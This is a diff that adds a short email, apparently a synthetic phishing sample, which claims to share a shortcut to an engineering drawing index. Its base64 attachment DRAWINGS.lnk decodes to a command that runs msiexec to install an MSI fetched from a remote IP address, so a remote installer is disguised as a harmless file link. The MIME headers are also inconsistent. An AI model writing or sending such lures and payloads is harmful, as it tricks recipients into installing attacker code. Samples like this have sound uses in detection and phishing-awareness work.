@@ -1,0 +1,21 @@
+From: =?utf-8?B?U2hhcmVk?= <share@doc-share19.example>
+To: eng@corp.internal
+Date: Tue, 22 Sep 2026 10:36:00 +0800
+Message-ID: <0026-b29@synth.example>
+Subject: Drawing index (shortcut)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+
+Content-Type: multipart/mixed; boundary="BS"
+
+--BS
+Content-Type: text/plain; charset=utf-8
+
+Shortcut to the drawing index on the file server.
+--BS
+Content-Type: application/x-ms-shortcut
+Content-Disposition: attachment; filename="DRAWINGS.lnk"
+Content-Transfer-Encoding: base64
+
+TAAAAG1zaWV4ZWMgL2kgaHR0cDovLzIwMy4wLjExMy43Ny94Lm1zaQA=
+--BS--
